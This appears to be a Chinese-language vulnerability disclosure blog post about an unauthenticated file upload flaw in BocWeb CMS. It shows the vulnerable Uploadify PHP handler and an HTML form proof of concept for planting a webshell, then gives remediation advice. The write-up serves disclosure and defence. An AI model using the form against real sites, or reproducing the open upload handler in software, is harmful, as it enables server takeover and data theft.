---
slug: /cms-file-upload
title: 某CMS任意文件上传影响大量上市企业
---

**供应链漏洞的影响面远超单点漏洞。** 当建站厂商的代码进入数百家企业，一个权限校验缺陷就会导致大规模系统入侵风险。通用组件（如文件上传）往往是安全盲区，原因在于它们来自第三方就被默认信任，缺乏独立的安全验证。本文记录的 BocWeb CMS 任意文件上传漏洞正是这一模式的典型案例：开源演示代码被直接集成进生产环境，权限控制缺失，最终影响涉及数百家上市公司的网站。

## 1 漏洞入口

**这个漏洞的根本原因是把演示代码直接用于生产环境，而没有补充任何权限控制。** 吉利、万科、广厦、万向、大华等大量企业官网底部标注着技术支持：杭州博采网络（[BocWeb](http://www.bocweb.cn/)）。在获得一份 BocWeb CMS 系统源码后，经过简单审计发现了多处问题，其中以 `/j/uploadify.php` 最为严重。[Uploadify](http://www.uploadify.com/) 是一款用来处理上传文件的开源组件，其官网 `demo` 中的 `uploadify.php` 用于演示后端处理上传文件的逻辑。

```php
<?php
/*
Uploadify
Copyright (c) 2012 Reactive Apps, Ronnie Garcia
Released under the MIT License <http://www.opensource.org/licenses/mit-license.php> 
*/

// Define a destination
$targetFolder = '/uploads'; // Relative to the root

if (!empty($_FILES)) {
    $tempFile = $_FILES['Filedata']['tmp_name'];
    $targetPath = $_SERVER['DOCUMENT_ROOT'] . $targetFolder;
    $targetFile = rtrim($targetPath,'/') . '/' . $_FILES['Filedata']['name'];
    
    $fileParts = pathinfo($_FILES['Filedata']['name']);
    
    move_uploaded_file($tempFile,$targetFile);
    echo $targetFile;
}
?>
```

**演示代码用于生产环境时如果没有做权限控制就直接是任意文件上传漏洞。** 这段代码本身作为演示是合理的，但 BocWeb 在将其集成到自己的 CMS 系统时，没有添加任何身份认证或文件类型校验，任何人都可以向这个接口上传任意文件。

<!-- truncate -->

## 2 漏洞证明

**验证方式极为简单，构造一个表单直接向接口提交文件即可完成利用。** 万科、绿城、广厦等企业站点均可通过这个接口直接上传 webshell，进而拿到服务器全部权限和数据。

`bocweb-upload.html`

```python
<!DOCTYPE html>
<html>
<head>
    <title>BocWeb Upload Demo</title>
</head>
<body>
    <form action="http://demo.feei.cn/bocweb/j/uploadify.php" method="post" enctype="multipart/form-data">
        <input type="text" name="folder" value="/">
        <input type="file" name="fileData" />
        <input type="submit" name="Upload">
    </form>
</body>
</html>
```

## 3 漏洞影响

**受影响厂商达数百家上市公司，说明一个建站厂商的代码缺陷可以产生规模化的系统入侵风险。**

![](./v_bocweb_01.webp)

**同一个漏洞两年内被独立发现并重复提交，说明漏洞治理存在系统性盲区。** 漏洞在 2013 年首次提交至补天平台，2015 年在乌云上再次出现，这一现象值得关注：漏洞修复后是否对全量受影响资产做了验证，供应商的修复进度是否传达到所有集成方，这些都是供应链漏洞治理中容易遗漏的环节。

已提交补天平台，已经修复完成。

![](./v_bocweb_02.webp)

## 4 修复方向

**文件上传接口的安全修复不能止步于权限控制，还需要覆盖多个层次。** 权限认证只解决了"谁可以上传"的问题，还需要限制"上传什么"和"存到哪里"：

- 文件类型白名单：只允许业务所需的特定扩展名，而不是依赖黑名单过滤
- 文件内容检测：校验文件头而不仅仅依赖扩展名，防止改名绕过
- 存储路径隔离：上传目录不应具备可执行权限，上传文件不应与 Web 可执行目录共存
- 接口访问控制：文件上传接口应做身份认证，即便是内部系统也不应完全开放

**集成第三方组件时，不能默认信任其安全性，必须进行独立的安全验证。** 供应商提供的演示代码面向的是功能展示场景，安全边界与生产环境差异显著，集成方有责任在引入时完成独立的安全评估。

漏洞已报告给CNCERT/乌云/补天或厂商且已修复完成，感谢厂商的重视及现金奖励。
